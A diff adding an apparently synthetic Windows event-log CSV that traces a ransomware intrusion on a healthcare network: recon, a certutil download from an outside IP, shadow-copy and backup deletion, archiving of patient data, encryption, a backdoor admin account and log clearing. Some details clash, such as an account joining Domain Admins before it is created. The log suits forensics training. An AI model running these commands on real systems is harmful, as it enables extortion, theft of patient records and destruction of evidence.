@@ -1,0 +1,49 @@
+timestamp,event_id,computer,username,event_type,description
+2024-11-21T00:10:07,4624,APPSERVER-01,svc-app,Network Logon,Network logon successful. Type 3. Account: svc-app. Source: 10.0.2.10. Authentication: NTLM. Elevated Token: Yes
+2024-11-21T00:10:09,4672,APPSERVER-01,svc-app,Special Privileges Assigned,Privileges assigned to new logon. Account: svc-app. Privileges: SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege
+2024-11-21T00:10:15,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\wbem\wmiprvse.exe. Parent: C:\Windows\System32\svchost.exe. PID: 2104
+2024-11-21T00:10:22,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wmiprvse.exe. CommandLine: cmd.exe /c whoami. PID: 3812
+2024-11-21T00:10:30,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net user administrator. PID: 4023
+2024-11-21T00:10:38,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\ipconfig.exe. Parent: cmd.exe. CommandLine: ipconfig /all. PID: 4156
+2024-11-21T00:11:05,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\certutil.exe. Parent: cmd.exe. CommandLine: certutil.exe -urlcache -split -f https://91.108.4.190/update.exe C:\Windows\Temp\update.exe. PID: 4387
+2024-11-21T00:11:47,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\Temp\update.exe. Parent: cmd.exe. CommandLine: update.exe -install. PID: 4612
+2024-11-21T00:12:03,4673,APPSERVER-01,svc-app,Privileged Service Call,Privileged service called. Service: Security Account Manager. Process: C:\Windows\Temp\update.exe. PID: 4612
+2024-11-21T00:12:15,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: update.exe. CommandLine: net group domain admins /domain. PID: 4891
+2024-11-21T00:25:01,4624,BACKUP-SERVER,Administrator,Network Logon,Network logon successful. Type 3. Account: Administrator. Source: 10.0.2.20. Authentication: NTLM. Elevated Token: Yes
+2024-11-21T00:25:03,4672,BACKUP-SERVER,Administrator,Special Privileges Assigned,Privileges assigned. Account: Administrator. Privileges: SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeTcbPrivilege
+2024-11-21T00:25:15,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wmiprvse.exe. CommandLine: cmd.exe /c ipconfig /all. PID: 1932
+2024-11-21T00:25:30,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net share. PID: 2014
+2024-11-21T00:26:05,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\wbadmin.exe. Parent: cmd.exe. CommandLine: wbadmin get versions. PID: 2207
+2024-11-21T00:30:22,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\vssadmin.exe. Parent: cmd.exe. CommandLine: vssadmin.exe Delete Shadows /All /Quiet. PID: 2644
+2024-11-21T00:31:07,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\wbadmin.exe. Parent: cmd.exe. CommandLine: wbadmin.exe DELETE SYSTEMSTATEBACKUP. PID: 2751
+2024-11-21T00:32:15,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\bcdedit.exe. Parent: cmd.exe. CommandLine: bcdedit.exe /set {default} recoveryenabled No. PID: 2893
+2024-11-21T00:33:40,7045,BACKUP-SERVER,Administrator,Service Installed,New service installed. Service Name: BlackVaultSvc. Display Name: Windows Update Service Helper. Binary: C:\Windows\Temp\bv_svc.exe. Start Type: Automatic
+2024-11-21T00:34:12,4697,BACKUP-SERVER,Administrator,Service Start,Scheduled task run. Task Name: BlackVaultSvc. Process: C:\Windows\Temp\bv_svc.exe. User: SYSTEM
+2024-11-21T00:35:41,4624,FILESERVER-02,Administrator,Network Logon,Network logon successful. Type 3. Account: Administrator. Source: 10.0.2.20. Authentication: NTLM. Elevated Token: Yes
+2024-11-21T00:35:43,4672,FILESERVER-02,Administrator,Special Privileges Assigned,Privileges assigned. Account: Administrator. Privileges: SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeTcbPrivilege
+2024-11-21T00:35:50,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wmiprvse.exe. CommandLine: cmd.exe /c dir C:\PatientData. PID: 3118
+2024-11-21T00:36:22,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net share PatientData$. PID: 3245
+2024-11-21T00:50:15,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\Temp\rar.exe. Parent: cmd.exe. CommandLine: rar.exe a -v500m C:\Windows\Temp\archive C:\PatientData\*.* -hp BlackVault2024!. PID: 4503
+2024-11-21T00:55:17,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\patient_records_2024.xlsx. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:55:29,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\lab_results_nov2024.pdf. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:55:41,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\billing_Q4_2024.csv. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:56:03,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\insurance_claims_2024.xlsx. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:56:18,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\employee_records.xlsx. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:56:34,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\prescriptions_db.mdb. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:57:02,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\surgery_schedules.xlsx. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T00:57:19,4663,FILESERVER-02,Administrator,Object Access,File access audit. Object: C:\PatientData\research_data_2024.zip. Access: ReadData. Process: rar.exe. PID: 4503
+2024-11-21T01:00:02,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\Temp\bv_encrypt.exe. Parent: cmd.exe. CommandLine: bv_encrypt.exe --target C:\PatientData --ext .BLACKVAULT --threads 4. PID: 5012
+2024-11-21T01:00:18,7045,FILESERVER-02,Administrator,Service Installed,New service installed. Service Name: BlackVaultEncSvc. Binary: C:\Windows\Temp\bv_encrypt.exe. Start Type: Automatic. Account: LocalSystem
+2024-11-21T01:15:05,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\vssadmin.exe. Parent: cmd.exe. CommandLine: vssadmin.exe Delete Shadows /All /Quiet. PID: 5441
+2024-11-21T01:15:47,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\bcdedit.exe. Parent: cmd.exe. CommandLine: bcdedit.exe /set {default} recoveryenabled No. PID: 5503
+2024-11-21T01:16:30,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\bcdedit.exe. Parent: cmd.exe. CommandLine: bcdedit.exe /set {default} safeboot minimal. PID: 5561
+2024-11-21T01:17:45,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net stop vss. PID: 5612
+2024-11-21T01:18:02,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net stop MSSQLSERVER. PID: 5644
+2024-11-21T01:18:19,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net stop "Backup Exec Agent". PID: 5681
+2024-11-21T00:46:02,4728,DC-01,Administrator,Group Membership Change,Member added to security-enabled global group. Group Name: Domain Admins. Member Account: backdoor_admin. Caller: Administrator
+2024-11-21T00:46:30,4720,DC-01,Administrator,User Account Created,New user account created. Account Name: backdoor_admin. Caller Account: Administrator. Domain: MEDHEALTHCARE
+2024-11-21T01:40:22,4688,FILESERVER-02,Administrator,Process Created,New process. Image: C:\Windows\System32\wevtutil.exe. Parent: cmd.exe. CommandLine: wevtutil.exe cl Security. PID: 7214
+2024-11-21T01:41:05,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\wevtutil.exe. Parent: cmd.exe. CommandLine: wevtutil.exe cl Security. PID: 6831
+2024-11-21T01:41:48,4688,APPSERVER-01,Administrator,Process Created,New process. Image: C:\Windows\System32\wevtutil.exe. Parent: cmd.exe. CommandLine: wevtutil.exe cl Security. PID: 6102
+2024-11-21T01:42:15,4688,APPSERVER-01,Administrator,Process Created,New process. Image: C:\Windows\System32\wevtutil.exe. Parent: cmd.exe. CommandLine: wevtutil.exe cl System. PID: 6148
+2024-11-21T01:42:55,4688,APPSERVER-01,Administrator,Process Created,New process. Image: C:\Windows\System32\wevtutil.exe. Parent: cmd.exe. CommandLine: wevtutil.exe cl Application. PID: 6193
